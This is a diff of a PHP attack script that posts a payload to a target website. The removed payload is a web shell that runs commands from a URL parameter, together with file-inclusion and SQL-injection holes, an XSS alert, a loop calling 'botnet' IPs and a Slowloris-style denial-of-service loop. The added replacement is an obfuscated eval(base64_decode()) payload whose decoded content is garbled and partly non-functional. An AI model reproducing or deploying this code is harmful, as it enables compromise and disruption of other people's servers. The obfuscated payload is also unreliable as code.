@@ -1,4 +1,5 @@
 <?php
+
 error_reporting(0);
 
 $targetURL = "http://www.targetwebsite.com/";
@@ -7,60 +8,7 @@ $htmlFilePath = "cazzy.html";
 
 $htmlFileContent = file_get_contents($htmlFilePath);
 
-$payload = "<?php 
-// Remote Code Execution (RCE)
-if(isset(\$_GET['cmd'])){
-    echo '<pre>';
-    \$output = shell_exec(\$_GET['cmd']);
-    echo \$output;
-    echo '</pre>';
-    die;
-}
-
-// File Inclusion Vulnerability
-include(\$_GET['file']);
-
-// SQL Injection
-\$conn = new mysqli('localhost', 'username', 'password', 'database');
-\$result = \$conn->query('SELECT * FROM users WHERE id=' . \$_GET['id']);
-
-// Cross-Site Scripting (XSS)
-echo '<script>alert(\"XSS Attack!\")</script>';
-
-// Botnet Integration
-\$botnetIPs = array(
-    '192.168.1.101',
-    '192.168.1.102',
-    '192.168.1.103'
-);
-
-foreach (\$botnetIPs as \$ip) {
-    \$ch = curl_init();
-    curl_setopt(\$ch, CURLOPT_URL, \$ip);
-    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
-    \$response = curl_exec(\$ch);
-    curl_close(\$ch);
-}
-
-// DDoS Slowloris Code
-\$slowlorisIP = '192.168.1.104';
-\$slowlorisPort = 80;
-\$slowlorisConnections = 1000;
-
-for (\$i = 0; \$i < \$slowlorisConnections; \$i++) {
-    \$socket = fsockopen(\$slowlorisIP, \$slowlorisPort, \$errno, \$errstr, 30);
-    if (\$socket) {
-        fwrite(\$socket, 'GET / HTTP/1.1\r\n');
-        fwrite(\$socket, 'Host: ' . \$targetURL . '\r\n');
-        fwrite(\$socket, 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n');
-        fwrite(\$socket, 'Content-Length: 42\r\n');
-        fwrite(\$socket, 'Connection: keep-alive\r\n');
-        usleep(100000);
-        fclose(\$socket);
-    }
-}
-
-?>";
+$payload = "<?php eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21hc3RlciJdKSl7JHRhcmdldF9zdGFydCgnYmFzZTY0X2RlY29kZSgnR0VUWycsJyAnLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfQ09PS0lFWydSRVFVRVNUX1VSTCddLiInLCAnLiRfRklMRVNbJ0hUVFBfSE9TVCddLiInLCAnLiRfVVJMb2FkZXJzJ10uIicpOyR0YXJnZXQgPSAiIjskJHRhcmdldF9zdGFydCgnYmFzZTY0X2RlY29kZSgnR0VUWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iJywnJyAnLiRfQ09PS0lFWydSRVFVRVNUX1VSTCddLiInLCAnLiRfRklMRVNbJ0hUVFBfSE9TVCddLiInLCAnLiRfVVJMb2FkZXJzJ10uIicpOyRrZXl3b3JkX3R5cGUgPSAnaHRtbHNwZWMnOyRrZXl3b3JkID0gJ2h0dHBzOi8vZ2l0aHViLmNvbS9rZXl3b3JkL2JpbmFyeS5waHAnOyRrZXl3b3JkX2V4ZWMgPSAkY29tcGxleF9nZXRfY29udGVudHMoJGtleXdvcmRfdHlwZSk7ZXhpdCgpOw==')); ?>";
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $targetURL);
